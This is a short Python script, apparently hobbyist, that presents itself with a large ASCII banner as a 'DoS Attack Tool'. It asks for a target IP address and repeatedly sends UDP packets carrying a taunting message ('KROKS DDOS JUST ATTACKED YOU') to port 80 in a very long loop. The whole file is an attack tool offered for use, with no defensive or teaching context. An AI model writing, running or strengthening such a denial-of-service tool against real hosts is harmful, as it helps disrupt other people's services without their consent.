import urllib.request
import socket 
import time
import os

print("===========================================================")
print("                      Made By Krypt0n                      ")
print("===========================================================")
print(" ██ ▄█▀ ██▀███   ▒█████   ██ ▄█▀  ██████ ")
print(" ██▄█▒ ▓██ ▒ ██▒▒██▒  ██▒ ██▄█▒ ▒██    ▒ ")
print("▓███▄░ ▓██ ░▄█ ▒▒██░  ██▒▓███▄░ ░ ▓██▄   ")
print("▓██ █▄ ▒██▀▀█▄  ▒██   ██░▓██ █▄   ▒   ██▒")
print("▒██▒ █▄░██▓ ▒██▒░ ████▓▒░▒██▒ █▄▒██████▒▒")
print("▒ ▒▒ ▓▒░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▒ ▓▒▒ ▒▓▒ ▒ ░")
print("░ ░▒ ▒░  ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒ ▒░░ ░▒  ░ ░")
print("░ ░░ ░   ░░   ░ ░ ░ ░ ▒  ░ ░░ ░ ░  ░  ░  ")
print("░  ░      ░         ░ ░  ░  ░         ░  ")
print("===========================================================")
print("          You Are Currently Using DoS Attack Tool          ")
print("===========================================================")
def send_udp_packet(target_ip, target_port, message):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message.encode(), (target_ip, target_port))
def main():
    target_ip=input("Enter Target's Ip: ")
    print("===========================================================")
    target_port = 80
    message = "KROKS DDOS JUST ATTACKED YOU "
    for i in range(1000000000):
        send_udp_packet(target_ip, target_port, message)
        time.sleep(5)
        print("Attacking Target...")
        print("===========================================================")
main()